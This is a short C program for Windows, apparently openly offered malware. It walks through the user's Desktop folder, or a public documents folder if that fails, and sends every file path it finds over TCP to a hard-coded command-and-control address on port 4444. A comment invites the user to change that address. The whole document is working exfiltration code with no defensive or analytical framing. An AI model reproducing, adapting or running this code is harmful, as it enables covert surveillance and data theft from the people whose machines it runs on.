#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <shlwapi.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")

#define SERVER_IP "192.168.0.77"  //IP of the C2/host to connect and send info (u can fcking change it)
#define SERVER_PORT 4444

void send_data(const char* data) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) != SOCKET_ERROR) {
        send(s, data, (int)strlen(data), 0);
    }

    closesocket(s);
    WSACleanup();
}

void exploit_vuln_and_crawl(const char* path) {
    WIN32_FIND_DATAA ffd;
    char search_path[MAX_PATH];
    HANDLE hFind;

    sprintf(search_path, "%s\\*", path);
    hFind = FindFirstFileA(search_path, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(ffd.cFileName, ".") != 0 && strcmp(ffd.cFileName, "..") != 0) {
            char full_path[MAX_PATH];
            sprintf(full_path, "%s\\%s", path, ffd.cFileName);

            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                exploit_vuln_and_crawl(full_path); 
            } else {
                send_data(full_path);
                Sleep(50);
            }
        }
    } while (FindNextFileA(hFind, &ffd) != 0);

    FindClose(hFind);
}

int main() {
    char desktop_path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path))) {
        exploit_vuln_and_crawl(desktop_path);
    } else {
        exploit_vuln_and_crawl("C:\\Users\\Public\\Documents");
    }

    return 0;
}
